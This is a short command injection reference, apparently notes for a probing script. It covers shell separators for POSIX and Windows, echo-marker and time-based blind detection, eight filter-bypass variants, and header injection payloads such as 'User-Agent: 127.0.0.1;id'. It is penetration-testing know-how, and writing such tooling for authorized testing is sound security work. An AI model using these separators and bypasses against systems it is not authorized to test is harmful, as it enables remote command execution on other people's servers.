# Command Injection Reference

## Separator matrix (per shell family)
The probe script sends these in order against `;` `|` `||` `&` backtick `$( )` newline `%0a`:
- POSIX: `;` `|` `||` `&` `` ` `` `$()` `\n` `%0a`
- Windows (cmd): `&` `|` `||` `^&` `& echo` + `%0d%0a`
- sh special: `;` inside quotes, `$( )` nested, `` ` ` `` nested

## Echo detection
Payload shape: `<sep><marker-cmd>` where marker-cmd produces a unique token in the response
(e.g. a long random hex) — the script generates one per run (`CMDECHO_<hex>`), so a match is
unambiguous. Commands tried per OS guess:
- linux: `echo CMDECHO_x` via `$(echo ...)`/backticks
- windows: `echo CMDECHO_x`
If the field is a hostname/ip field: use `;echo CMDECHO_x` and also `$(echo CMDECHO_x)`;
ping-style: time-based fallback below.

## Time-based blind (when no echo)
Baseline: N=5 requests with the plain value, measure T_base mean/std.
Probe: `<sep>sleep 3` (linux) / `<sep>timeout /t 3` (win) / `;ping -c 3 127.0.0.1`.
Signal: T_probe − T_base ≥ 3σ and ≥ 2.5s. One confirmed separator + timing = blind RCE.
Always record the baseline table in evidence.

## Filter-bypass variants (applied to the winning separator)
| id | variant | catches |
|---|---|---|
| b1 | separator upper/lower case mix `SeEp` | case filter |
| b2 | double-encode the payload (`%253b`) | double-decode |
| b3 | tab instead of space after separator | whitespace filter |
| b4 | `|&` / `|;` / `&|` combos | sequence filter |
| b5 | nested: `$($(){` style / `$(echo $(echo ..))` | depth-limited sanitizer |
| b6 | unicode space `%c2%a0` after separator | space class filter |
| b7 | comment breakers: `#` `//` `/* */` after the injected token | keyword match filter |
| b8 | header route: same separator via `User-Agent` / `X-Forwarded-For` | query-only filter |

## Header surface (always test after a query win)
- `User-Agent: 127.0.0.1;id` — common in "host check" endpoints, logs-to-cmd bugs
- `X-Forwarded-For: 1.2.3.4;id`
- `Referer`, `X-Real-IP`, `Forwarded`
- Cookie values that get echoed into a shell context (rare, but free to test)
